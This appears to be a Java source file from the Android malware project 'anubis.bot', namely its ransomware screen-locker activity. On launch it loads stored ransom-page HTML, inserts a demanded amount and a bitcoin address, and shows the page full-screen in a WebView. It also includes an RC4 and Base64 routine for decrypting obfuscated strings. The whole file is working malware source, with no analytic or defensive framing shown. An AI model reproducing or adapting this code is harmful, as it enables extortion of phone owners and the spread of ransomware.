package anubis.bot.myapplication.Activity;

import android.os.Bundle;
import android.app.Activity;
import android.util.Base64;
import android.view.View;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.R;
import anubis.bot.myapplication.UtilsClass;

public class ActivityScreenLocker extends Activity {
    UtilsClass utilsClass = new UtilsClass();

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
       // setContentView(R.layout.activity_screen_locker);
            String html = utilsClass.SetRead(this,"htmllocker");
            String amount = utilsClass.SetRead(this,"lock_amount");
            String btc = utilsClass.SetRead(this,"lock_btc");
            html = html.replace("<amount>",amount);
            html = html.replace("<bitcoin>",btc);

        WebView wv = new WebView(this);
        wv.getSettings().setJavaScriptEnabled(true);
        wv.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
        wv.setWebViewClient(new ActivityScreenLocker.MyWebViewClient());
        wv.setWebChromeClient(new ActivityScreenLocker.MyWebChromeClient());
        wv.loadData( html,"text/html", "UTF-8");
        setContentView(wv);

    }

    private class MyWebViewClient extends WebViewClient {
        @Override
        public void onPageFinished (WebView view, String url){

        }
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {

            return false;
        }
    }
    private class MyWebChromeClient extends WebChromeClient {

        @Override
        public boolean onJsAlert(WebView view, String url, String message, JsResult result) {

            return true;
        }
    }

}
